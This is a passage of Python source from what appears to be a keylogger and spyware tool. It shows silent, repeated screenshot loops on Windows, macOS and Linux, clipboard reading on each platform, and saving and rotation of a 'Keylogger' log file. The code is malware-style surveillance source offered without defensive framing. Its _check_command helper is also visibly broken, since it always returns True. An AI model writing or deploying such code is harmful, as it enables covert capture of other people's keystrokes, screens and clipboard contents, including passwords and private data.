                    timestamp = self._get_timestamp(include_time=True)
                    filename = f"screenshot_{timestamp}.png"
                    filepath = os.path.join(self.screenshot_dir, filename)
                    
                    # Save screenshot
                    screenshot.save(filepath)
                    screenshot_count += 1
                    
                    logger.debug(f"Captured screenshot: {filepath}")
                    
                    # Check if we need to rotate screenshots
                    self._rotate_screenshots(self.screenshot_dir, screenshot_count)
                except Exception as e:
                    logger.error(f"Windows screenshot error: {e}")
                
                # Sleep before next capture
                time.sleep(self.screenshot_interval)
                
        except Exception as e:
            logger.error(f"Windows screen capture error: {e}")
            self.screencapture_running = False
    
    def _macos_screen_capture(self) -> None:
        """macOS-specific screen capture implementation."""
        try:
            import subprocess
            
            screenshot_count = 0
            
            while self.screencapture_running:
                try:
                    # Generate filename
                    timestamp = self._get_timestamp(include_time=True)
                    filename = f"screenshot_{timestamp}.png"
                    filepath = os.path.join(self.screenshot_dir, filename)
                    
                    # Capture screenshot using screencapture utility
                    subprocess.run(["screencapture", "-x", filepath], check=True)
                    screenshot_count += 1
                    
                    logger.debug(f"Captured screenshot: {filepath}")
                    
                    # Check if we need to rotate screenshots
                    self._rotate_screenshots(self.screenshot_dir, screenshot_count)
                except Exception as e:
                    logger.error(f"macOS screenshot error: {e}")
                
                # Sleep before next capture
                time.sleep(self.screenshot_interval)
                
        except Exception as e:
            logger.error(f"macOS screen capture error: {e}")
            self.screencapture_running = False
    
    def _linux_screen_capture(self) -> None:
        """Linux-specific screen capture implementation."""
        try:
            import subprocess
            
            screenshot_count = 0
            
            while self.screencapture_running:
                try:
                    # Generate filename
                    timestamp = self._get_timestamp(include_time=True)
                    filename = f"screenshot_{timestamp}.png"
                    filepath = os.path.join(self.screenshot_dir, filename)
                    
                    # Try to use scrot first, then fall back to import
                    try:
                        if self._check_command("scrot"):
                            subprocess.run(["scrot", filepath], check=True)
                        elif self._check_command("import"):
                            # ImageMagick's import command
                            subprocess.run(["import", "-window", "root", filepath], check=True)
                        else:
                            # Try using pyscreenshot as last resort
                            import pyscreenshot as ImageGrab
                            screenshot = ImageGrab.grab()
                            screenshot.save(filepath)
                    except:
                        # Try using PIL as a fallback
                        from PIL import ImageGrab
                        screenshot = ImageGrab.grab()
                        screenshot.save(filepath)
                    
                    screenshot_count += 1
                    
                    logger.debug(f"Captured screenshot: {filepath}")
                    
                    # Check if we need to rotate screenshots
                    self._rotate_screenshots(self.screenshot_dir, screenshot_count)
                except Exception as e:
                    logger.error(f"Linux screenshot error: {e}")
                
                # Sleep before next capture
                time.sleep(self.screenshot_interval)
                
        except Exception as e:
            logger.error(f"Linux screen capture error: {e}")
            self.screencapture_running = False
    
    def _capture_windows_screenshot(self, output_file: str) -> bool:
        """Capture a Windows screenshot."""
        try:
            from PIL import ImageGrab
            
            # Capture screenshot
            screenshot = ImageGrab.grab()
            
            # Save screenshot
            screenshot.save(output_file)
            
            return True
        except Exception as e:
            logger.error(f"Windows screenshot error: {e}")
            return False
    
    def _capture_macos_screenshot(self, output_file: str) -> bool:
        """Capture a macOS screenshot."""
        try:
            import subprocess
            
            # Capture screenshot using screencapture utility
            subprocess.run(["screencapture", "-x", output_file], check=True)
            
            return True
        except Exception as e:
            logger.error(f"macOS screenshot error: {e}")
            return False
    
    def _capture_linux_screenshot(self, output_file: str) -> bool:
        """Capture a Linux screenshot."""
        try:
            import subprocess
            
            # Try to use scrot first, then fall back to import
            try:
                if self._check_command("scrot"):
                    subprocess.run(["scrot", output_file], check=True)
                elif self._check_command("import"):
                    # ImageMagick's import command
                    subprocess.run(["import", "-window", "root", output_file], check=True)
                else:
                    # Try using pyscreenshot as last resort
                    import pyscreenshot as ImageGrab
                    screenshot = ImageGrab.grab()
                    screenshot.save(output_file)
            except:
                # Try using PIL as a fallback
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                screenshot.save(output_file)
            
            return True
        except Exception as e:
            logger.error(f"Linux screenshot error: {e}")
            return False
    
    def _get_windows_clipboard(self) -> Optional[str]:
        """Get Windows clipboard content."""
        try:
            import win32clipboard
            
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                clipboard_content = clipboard_data.decode('utf-8', errors='ignore')
            elif win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                clipboard_content = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            else:
                clipboard_content = None
            win32clipboard.CloseClipboard()
            
            return clipboard_content
        except Exception as e:
            logger.error(f"Windows clipboard error: {e}")
            return None
    
    def _get_macos_clipboard(self) -> Optional[str]:
        """Get macOS clipboard content."""
        try:
            from AppKit import NSPasteboard, NSStringPboardType
            
            pasteboard = NSPasteboard.generalPasteboard()
            clipboard_content = pasteboard.stringForType_(NSStringPboardType)
            
            return clipboard_content
        except Exception as e:
            logger.error(f"macOS clipboard error: {e}")
            return None
    
    def _get_linux_clipboard(self) -> Optional[str]:
        """Get Linux clipboard content."""
        try:
            import pyperclip
            
            clipboard_content = pyperclip.paste()
            
            return clipboard_content
        except Exception as e:
            logger.error(f"Linux clipboard error: {e}")
            return None
    
    def _save_keylog_data(self) -> None:
        """Save captured keylog data to file."""
        if not self.keylog_data:
            return
        
        try:
            # Create file if it doesn't exist
            if not os.path.exists(self.keylog_file):
                with open(self.keylog_file, "w", encoding="utf-8", errors="ignore") as f:
                    f.write(f"[Keylogger started: {self._get_timestamp(include_time=True)}]\n\n")
            
            # Append data to file
            with open(self.keylog_file, "a", encoding="utf-8", errors="ignore") as f:
                f.write(''.join(self.keylog_data))
            
            # Clear data
            self.keylog_data = []
            
            # Check file size and rotate if needed
            if os.path.getsize(self.keylog_file) > self.max_file_size:
                self._rotate_keylog_file()
        
        except Exception as e:
            logger.error(f"Error saving keylog data: {e}")
    
    def _rotate_keylog_file(self) -> None:
        """Rotate keylog file when it gets too large."""
        try:
            if not os.path.exists(self.keylog_file):
                return
            
            # Create archive directory
            archive_dir = os.path.join(self.output_dir, "archive")
            os.makedirs(archive_dir, exist_ok=True)
            
            # Move current file to archive with timestamp
            timestamp = self._get_timestamp()
            archive_file = os.path.join(archive_dir, f"keylog_{timestamp}.txt")
            
            import shutil
            shutil.move(self.keylog_file, archive_file)
            
            # Create new file
            with open(self.keylog_file, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"[Keylogger rotated: {self._get_timestamp(include_time=True)}]\n\n")
        
        except Exception as e:
            logger.error(f"Error rotating keylog file: {e}")
    
    def _rotate_screenshots(self, screenshot_dir: str, current_count: int,
                          max_screenshots: int = 1000) -> None:
        """Rotate screenshots when too many are collected."""
        try:
            # Check if we need to rotate
            if current_count <= max_screenshots:
                return
            
            # Get list of screenshot files
            screenshots = []
            for filename in os.listdir(screenshot_dir):
                if filename.lower().endswith((".png", ".jpg", ".jpeg")):
                    filepath = os.path.join(screenshot_dir, filename)
                    screenshots.append((filepath, os.path.getmtime(filepath)))
            
            # Sort by modification time (oldest first)
            screenshots.sort(key=lambda x: x[1])
            
            # Delete oldest screenshots to get below max
            if len(screenshots) > max_screenshots:
                for filepath, _ in screenshots[:len(screenshots) - max_screenshots]:
                    os.remove(filepath)
        
        except Exception as e:
            logger.error(f"Error rotating screenshots: {e}")
    
    def _check_dependency(self, module_name: str, install_cmd: str) -> bool:
        """Check if a Python dependency is installed."""
        try:
            __import__(module_name)
            return True
        except ImportError:
            logger.warning(f"Missing dependency: {module_name}")
            logger.info(f"Install with: {install_cmd}")
            return False
    
    def _check_command(self, command: str) -> bool:
        """Check if a command is available."""
        try:
            subprocess.run(["which", command], 
                         stdout=subprocess.PIPE, 
                         stderr=subprocess.PIPE, 
                         check=False)
            return True
        except:
            return False
    
    def _get_timestamp(self, include_time: bool = False) -> str:
        """Get a timestamp string."""
        if include_time:
            return datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        else:
            return datetime.datetime.now().strftime("%Y-%m-%d")
    
    def _get_file_timestamp(self, filepath: str) -> str:
        """Get a timestamp from a file's modification time."""
        return datetime.datetime.fromtimestamp(os.path.getmtime(filepath)).strftime("%Y-%m-%d_%H-%M-%S")